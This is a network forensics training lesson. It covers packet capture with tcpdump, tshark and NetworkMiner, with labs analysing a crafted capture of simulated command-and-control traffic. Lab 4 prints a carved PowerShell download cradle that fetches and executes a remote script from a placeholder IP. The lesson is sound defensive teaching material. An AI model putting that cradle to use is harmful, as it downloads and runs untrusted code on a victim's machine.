# Day 28: Network Forensics Fundamentals & Packet Capture

> **Phase 4: Network Forensics** · **Level:** 🟡→🔴 Intermediate to Advanced · **Time:** ~4 hours (reading + labs) · **Posted:** 2026-10-25
>
> **Tools today:** 🛠️ tcpdump · 🛠️ Wireshark (tshark) · 🛠️ NetworkMiner

---

## 🎯 Learning objectives

By the end of today you will be able to:

1. Explain what network evidence is, the difference between **full packet capture** and **flow/metadata**, and where you capture it.
2. Read the **PCAP** format and the **5-tuple**, and follow a TCP conversation across the TCP/IP layers.
3. Capture and filter traffic with **tcpdump** (BPF capture filters) and analyse it with **Wireshark/tshark** (display filters, statistics, follow-stream).
4. Extract application-layer evidence — DNS answers, HTTP requests, and **transferred files** — from a capture, and let **NetworkMiner** carve hosts/files/credentials.
5. Know the limits: encryption, capture gaps, volume/retention, and the legal/privacy weight of intercepting traffic.

---

## Part 1: The lesson

The WS-ALICE payload kept pointing outward — a download cradle, an rclone exfil, the C2 at `203.0.113.50`. Phase 4 follows it onto **the wire**. Network evidence is special: it's **independent** of the endpoint (a wiped host can't erase what a sensor already recorded), and it captures the one thing disk and memory often can't — **what actually left the building**.

### 1.1 Full capture vs flow vs logs

Three fidelities, decreasing in size and detail:

- **Full packet capture (PCAP)** — every byte of every frame. You can reconstruct files, read unencrypted payloads, and re-analyse later with new questions. Expensive to store; usually a rolling buffer at the perimeter or a targeted capture on a host.
- **Flow / metadata (NetFlow, IPFIX, Zeek logs)** — who talked to whom, when, how much (the 5-tuple + counts + timings), without the payload. Cheap, kept for months, and enough to spot beaconing and exfil volume (Day 29).
- **Device logs** — firewall/proxy/DNS logs: decisions and names, no packets.

Today is full capture; tomorrow is metadata and detection.

### 1.2 PCAP and the 5-tuple

A capture file (classic **libpcap** `.pcap`, or the newer **pcapng**) is a global header plus, per packet, a timestamp, the captured length, and the raw frame bytes. Each frame stacks the TCP/IP layers: **Ethernet** (MACs) → **IP** (src/dst addresses, TTL) → **TCP/UDP** (src/dst ports, flags, seq/ack) → **application** (DNS, HTTP, TLS…). A flow is identified by its **5-tuple**: *source IP, source port, destination IP, destination port, protocol*. Reassembling a TCP stream (ordering by seq numbers, following both directions) turns packets back into the bytes an application sent — the request, the response, the file.

### 1.3 Where you capture

A capture only sees traffic that reaches the sensor:

- **SPAN / mirror port** on a switch, or a **network TAP** inline — the classic perimeter/core sensor, sees others' traffic.
- **On the host** itself (tcpdump on the endpoint) — sees only that host's traffic, and only if it's running when the traffic flows.
- **Inline device** (firewall/IPS) — can capture and block.

What the sensor can't see, you don't have: traffic on another VLAN, inside an encrypted tunnel you don't terminate, or that flowed before capture started. **Promiscuous mode** lets an interface keep frames not addressed to it (needed on a SPAN port).

### 1.4 What a capture proves, and its limits

A capture is strong evidence of **what crossed the wire**: the DNS name resolved, the exact HTTP request, the file downloaded, the bytes exfiltrated, the timing of a beacon. Limits to state honestly:

- **Encryption.** TLS hides the payload; you still get the **5-tuple, timing, volumes, SNI/certificate** (often the destination hostname), and JA3/JA4 fingerprints — plenty for detection, not the plaintext.
- **Gaps.** You only have what was captured; a dropped-packet buffer, a missed VLAN, or capture that started late all leave holes.
- **Volume & retention.** Full capture is huge; most shops keep a short full-PCAP window and longer flow/logs. Know your retention before you promise an answer.
- **Legal/privacy.** Intercepting traffic can be **wiretapping** — do it only under proper authority (policy, consent, warrant). Treat captured content as sensitive.

Today's labs **run tcpdump and tshark for real** on a crafted capture of the WS-ALICE C2 traffic; **NetworkMiner** is a .NET GUI tool (documented, not run on this headless Linux box).

---

## Part 2: Tools

**tcpdump** and **Wireshark/tshark** run here. **NetworkMiner** is a .NET/GUI tool (Windows, or Linux/macOS via Mono) and isn't run on this headless box. `VER` is the version you fetch. Live capture needs root and a real interface; the labs read a capture file, which doesn't.

### 🛠️ Tool 1: tcpdump

| | |
|---|---|
| **What** | The classic command-line packet capturer/printer, built on libpcap and BPF. |
| **Why** | Everywhere, tiny, scriptable; the right tool to **capture** at the console and to take a quick look, with the same BPF filter language Wireshark uses for capture. |

#### Requirements

- Linux/macOS/BSD; **root** (or `CAP_NET_RAW`) to capture live. Reading a `.pcap` needs no privilege.

#### Installation

```bash
sudo apt install -y tcpdump          # Debian/Ubuntu/SIFT (validated here: 4.99.x)
sudo dnf install tcpdump             # Fedora/RHEL
brew install tcpdump                 # macOS
```

#### Configuration / first use

```bash
# Capture to a file (write raw, don't print), full packets (-s 0), on one interface:
sudo tcpdump -i eth0 -s 0 -w capture.pcap
# A BPF capture filter (only this host and web/DNS), rotating files:
sudo tcpdump -i eth0 'host 203.0.113.50 and (tcp port 80 or udp port 53)' -w c.pcap -C 100 -W 10
# Read a capture, no name resolution (-n), show link/verbose as needed:
tcpdump -n -r capture.pcap
tcpdump -n -r capture.pcap 'tcp[tcpflags] & tcp-syn != 0'   # SYNs only
```

#### Troubleshooting

| Symptom | Fix |
|---|---|
| Truncated packets | Set snap length `-s 0` (older tcpdump defaulted to 68/96 bytes). |
| Slow / reverse-DNS stalls | Add `-n` (and `-nn` for ports) to disable name resolution. |
| "You don't have permission to capture" | Run with `sudo`, or grant `CAP_NET_RAW`; reading a file needs neither. |
| Nothing on a SPAN port | Put the interface in promiscuous mode (default for tcpdump) and confirm the mirror config. |

### 🛠️ Tool 2: Wireshark / tshark

| | |
|---|---|
| **What** | The reference protocol analyser: a GUI (Wireshark) and a CLI (tshark), with ~3000 dissectors, display filters, statistics, stream following and object export. |
| **Why** | Deep dissection of almost any protocol, powerful **display filters**, and extraction of application objects — the workhorse of packet analysis. |

#### Requirements

- Any OS. Install **Wireshark** (bundles tshark, capinfos, editcap, mergecap). Capturing live needs privilege; reading files doesn't.

#### Installation

```bash
sudo apt install -y tshark wireshark   # Debian/Ubuntu/SIFT (validated here: 4.2.x)
sudo dnf install wireshark-cli         # Fedora/RHEL
brew install --cask wireshark          # macOS (GUI + CLI)
# Download/docs: https://www.wireshark.org/download.html
```

#### Configuration / first use

```bash
tshark -r capture.pcap -Y 'http or dns'                     # display filter
tshark -r capture.pcap -q -z io,phs                         # protocol hierarchy
tshark -r capture.pcap -q -z conv,tcp                       # conversations
tshark -r capture.pcap -q -z follow,tcp,ascii,0             # follow a TCP stream
tshark -r capture.pcap --export-objects "http,./out"        # carve transferred files
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e dns.qry.name  # pick fields
```

Note the two filter languages: **capture filters** (BPF: `host x and port y`) decide what's recorded; **display filters** (`http.request.method == "GET"`) decide what's shown.

#### Troubleshooting

| Symptom | Fix |
|---|---|
| Timing/stats noise in scripts | Use `-q` with `-z`, or `-T fields` for clean columns; write once and parse. |
| Checksums flagged "bad" | Often **checksum offload** on the capturing NIC, not real corruption; disable checksum validation or ignore. |
| Can't follow a stream | Ensure full packets were captured (`-s 0`); truncated payloads can't be reassembled. |
| TLS payload unreadable | Expected — supply keys (`SSLKEYLOGFILE`) to decrypt, else analyse metadata/SNI/JA3. |

### 🛠️ Tool 3: NetworkMiner

| | |
|---|---|
| **What** | Netresec's **network forensic analysis tool** (NFAT): load a PCAP and it extracts hosts, sessions, DNS, transferred **files**, images and **credentials** into sortable tabs. |
| **Why** | Fast artifact-centric triage — "what files/creds/hosts are in this capture?" — without writing filters; great for handing a capture to an analyst. |

#### Requirements

- Windows (native), or Linux/macOS via **Mono**. A free edition exists; a Professional edition adds features and a CLI (`NetworkMinerCLI`).

#### Installation

```text
Download NetworkMiner (version VER) from https://www.netresec.com/?page=NetworkMiner (free edition).
Windows: unzip and run NetworkMiner.exe. Linux/macOS: install Mono, then `mono NetworkMiner.exe`.
Confirm current steps against Netresec's documentation.
```

#### Configuration / first use

```text
1. File -> Open -> capture.pcap  (or drag it in).
2. Review the tabs: Hosts, Sessions, DNS, Files, Images, Credentials, Parameters.
3. Right-click an extracted file to save it; sort Hosts by traffic to find the talkers.
   (Professional adds NetworkMinerCLI for scripted/batch extraction.)
```

#### Troubleshooting

| Symptom | Fix |
|---|---|
| Won't start on Linux | Install a supported **Mono** runtime; run `mono NetworkMiner.exe`. |
| No files extracted | They may be encrypted (TLS) or truncated; NetworkMiner carves only what crossed in clear and was fully captured. |
| Huge PCAP is slow | Pre-filter with tcpdump/editcap to the hosts/time window of interest first. |

---

## Part 3: Hands-on labs

You work a capture of the WS-ALICE C2 traffic. `mk_pcap.py` writes a small, valid PCAP — DNS, the TCP handshake, the HTTP `GET /payload.ps1` and its response (the download cradle), and a later beacon to `:443`. tcpdump and tshark run for real; NetworkMiner (GUI/.NET) is in Part 2.

Run on Ubuntu/SIFT. Reading a capture needs no root.

```bash
sudo apt update && sudo apt install -y tcpdump tshark python3 git
git -C ~/DFIR pull 2>/dev/null || git clone https://github.com/Mr-Phoenix07/DFIR.git ~/DFIR
mkdir -p ~/cases/LAB-028/{evidence,work,notes} && cd ~/cases/LAB-028
export TZ=UTC
python3 ~/DFIR/scripts/mk_pcap.py evidence/wsalice.pcap
capinfos -c -d -u evidence/wsalice.pcap 2>/dev/null
```

```
wrote evidence/wsalice.pcap: 10 packets
File name:           evidence/wsalice.pcap
Number of packets:   10
Data size:           888 bytes
Capture duration:    5.000000 seconds
```

### Lab 1: Read the capture with tcpdump (10 min)

One command prints the whole conversation. `-ttt` shows the gap between packets, `-n` skips name resolution:

```bash
tcpdump -n -ttt -r evidence/wsalice.pcap 2>/dev/null
```

```
 00:00:00.000000 IP 10.20.30.40.50000 > 8.8.8.8.53: 6699+ A? cdn.ws-alice-c2.example. (41)
 00:00:00.012000 IP 8.8.8.8.53 > 10.20.30.40.50000: 6699 1/0/0 A 203.0.113.50 (57)
 00:00:00.008000 IP 10.20.30.40.49200 > 203.0.113.50.80: Flags [S], seq 1000, win 64240, length 0
 00:00:00.015000 IP 203.0.113.50.80 > 10.20.30.40.49200: Flags [S.], seq 5000, ack 1001, win 64240, length 0
 00:00:00.001000 IP 10.20.30.40.49200 > 203.0.113.50.80: Flags [.], ack 1, win 64240, length 0
 00:00:00.004000 IP 10.20.30.40.49200 > 203.0.113.50.80: Flags [P.], seq 1:99, ack 1, win 64240, length 98: HTTP: GET /payload.ps1 HTTP/1.1
 00:00:00.015000 IP 203.0.113.50.80 > 10.20.30.40.49200: Flags [.], ack 99, win 64240, length 0
 00:00:00.005000 IP 203.0.113.50.80 > 10.20.30.40.49200: Flags [P.], seq 1:177, ack 99, win 64240, length 176: HTTP: HTTP/1.1 200 OK
 00:00:00.001000 IP 10.20.30.40.49200 > 203.0.113.50.80: Flags [.], ack 177, win 64240, length 0
 00:00:04.939000 IP 10.20.30.40.49555 > 203.0.113.50.443: Flags [S], seq 9000, win 64240, length 0
```

The entire intrusion-on-the-wire in ten packets: a DNS `A?` for the C2 name answered with `203.0.113.50`, the TCP handshake to `:80`, the `GET /payload.ps1`, the server's `200 OK`, and — **4.9 seconds later** — a fresh SYN to `:443`. That delayed, separate connection is the exfil channel opening; the inter-packet delta is the first hint of beaconing (Day 29).

### Lab 2: Shape of the traffic with tshark (15 min)

Before reading payloads, characterise the capture — what protocols, and who talked to whom:

```bash
echo '--- protocol hierarchy ---'
tshark -r evidence/wsalice.pcap -q -z io,phs 2>/dev/null | sed -n '/^eth/,/^===/p' | grep -v '^==='
echo '--- TCP conversations ---'
tshark -r evidence/wsalice.pcap -q -z conv,tcp 2>/dev/null | grep '<->'
```

```
--- protocol hierarchy ---
eth                                      frames:10 bytes:888
  ip                                     frames:10 bytes:888
    udp                                  frames:2 bytes:182
      dns                                frames:2 bytes:182
    tcp                                  frames:8 bytes:706
      http                               frames:2 bytes:382
        data-text-lines                  frames:1 bytes:230
--- TCP conversations ---
10.20.30.40:49200          <-> 203.0.113.50:80                  3 338 bytes       4 314 bytes       7 652 bytes     0.020000000         0.0410
10.20.30.40:49555          <-> 203.0.113.50:443                 0 0 bytes         1 54 bytes        1 54 bytes      5.000000000         0.0000
```

The protocol hierarchy shows DNS over UDP and HTTP over TCP; the conversation table shows two flows — the HTTP session on `:80`, and the `:443` flow that started at the 5-second mark and carried nothing but a SYN in this capture. Conversations are how you spot the one odd flow in a sea of normal ones.

### Lab 3: Application-layer evidence (15 min)

`-T fields` pulls exactly the dissected values you want, clean enough to grep or load into a sheet:

```bash
echo '--- DNS (query name -> answer) ---'
tshark -r evidence/wsalice.pcap -Y dns -T fields -e dns.qry.name -e dns.a 2>/dev/null
echo '--- HTTP (method, uri, host, response code) ---'
tshark -r evidence/wsalice.pcap -Y http -T fields -e http.request.method -e http.request.uri -e http.host -e http.response.code 2>/dev/null
```

```
--- DNS (query name -> answer) ---
cdn.ws-alice-c2.example	
cdn.ws-alice-c2.example	203.0.113.50
--- HTTP (method, uri, host, response code) ---
GET	/payload.ps1	cdn.ws-alice-c2.example	
			200
```

The DNS answer ties the C2 **name** to its **IP**; the HTTP fields give the **method, URI and Host** of the request and the **200** response. These are the facts you put in a report — "WS-ALICE resolved `cdn.ws-alice-c2.example` to 203.0.113.50 and fetched `/payload.ps1`" — each provable from the packets.

### Lab 4: Carve the transferred file (10 min)

Wireshark reassembles the TCP stream and can export the object that crossed it — the actual payload:

```bash
tshark -r evidence/wsalice.pcap --export-objects "http,work" -q 2>/dev/null
echo "carved: $(ls work)"
cat work/payload.ps1
```

```
carved: payload.ps1
IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/payload.ps1'); Start-Sleep 5
```

There's the file off the wire: the PowerShell download cradle, byte-for-byte, carved straight from the HTTP response. This is the same reconstruction NetworkMiner does automatically into its **Files** tab — and the direct link between the network capture and the memory/disk artifacts you found in Phases 2–3.

---

## ✅ Knowledge check

1. Full packet capture, flow/NetFlow, and device logs — rank them by size and by detail, and give one thing each is best for.
2. What is the 5-tuple, and what does reassembling a TCP stream recover that the raw packets don't show at a glance?
3. You capture on a host with tcpdump but miss the attack. Give two capture-placement reasons the traffic might not have been seen.
4. A capture filter vs a display filter — which is which, and why can't a display filter recover traffic you didn't capture?
5. The C2 session is TLS. What can you still learn from the capture, and what can't you?
6. `tcpdump` shows truncated payloads and Wireshark can't follow the stream. What capture option was wrong?
7. Wireshark flags many packets "checksum bad" on a capture from the sending host. Real corruption?
8. Before you run a packet capture on a network you administer, what must you check, and how do you treat the captured data?

<details>
<summary><b>Answers</b></summary>

1. **Full PCAP** — biggest, most detail; best for reconstructing files/payloads and re-analysis. **Flow/NetFlow** — small, metadata only; best for long-retention detection of beaconing/exfil volume. **Device logs** — smallest; best for decisions/names (what the proxy/DNS/firewall allowed or resolved). Size: PCAP ≫ flow ≫ logs; detail the same order.
2. The **5-tuple** = source IP, source port, destination IP, destination port, protocol — it identifies a flow. Reassembling a TCP stream orders segments by sequence number and joins both directions, recovering the **application bytes** (the request/response/file), which are split across many packets and out of order on the wire.
3. Any two: the traffic was on a **different VLAN/segment** the host doesn't see; capture **started after** the traffic flowed; it rode an **encrypted tunnel/another interface**; the host-based capture only sees that host, missing lateral traffic between others; buffer **drops** under load.
4. **Capture filters (BPF)** decide what is *recorded*; **display filters** decide what is *shown* from what was recorded. A display filter can't recover un-captured traffic because those bytes were **never written to the file** — filtering only hides, it can't create.
5. You still get the **5-tuple, timing, byte volumes, SNI/certificate (often the hostname), and JA3/JA4 fingerprints** — enough to identify and detect the C2. You **cannot** read the encrypted payload without the session keys (`SSLKEYLOGFILE`/exported keys).
6. The **snap length** was too small (e.g. old default 68/96 bytes); capture with **`-s 0`** so full payloads are stored and streams can be reassembled.
7. Usually **not** — it's **checksum offload**: the NIC computes checksums after capture, so locally-captured outbound packets show "bad" in the trace though they're fine on the wire. Disable checksum validation (or ignore) rather than chase corruption.
8. Confirm **authority**: policy/consent/warrant — intercepting traffic can be wiretapping. Capture the **minimum needed**, store it as **sensitive** evidence (restricted access, chain of custody), and mind that payloads may contain personal/credential data.

</details>

---

## 📚 Further reading

- `tcpdump` man page and https://www.tcpdump.org — the BPF capture-filter syntax
- Wireshark User's Guide (https://www.wireshark.org/docs/) — display filters, statistics, follow-stream, `tshark`/`capinfos`/`editcap`
- Wireshark display-filter reference and the `-z` statistics catalogue
- Netresec NetworkMiner (https://www.netresec.com) and its PCAP sample captures
- RFC 1761 (libpcap) and the pcapng spec; SANS *Network Forensics* material
- *Practical Packet Analysis* (Chris Sanders) — capturing, filtering and reassembly

---

## ⏭️ Tomorrow: Day 29

**Network security monitoring: logs, alerts & beacon detection.** Tools: **Zeek**, **Suricata**, **RITA**.
Today was full packets; tomorrow is the metadata layer at scale — Zeek's connection logs, Suricata's signature alerts, and RITA hunting the **beacon** whose 5-second heartbeat you just glimpsed.

---

<sub>Part of the <a href="../README.md">DFIR Daily</a> series · <a href="../CURRICULUM.md">Full 60-day curriculum</a> · For educational and authorised use only.</sub>
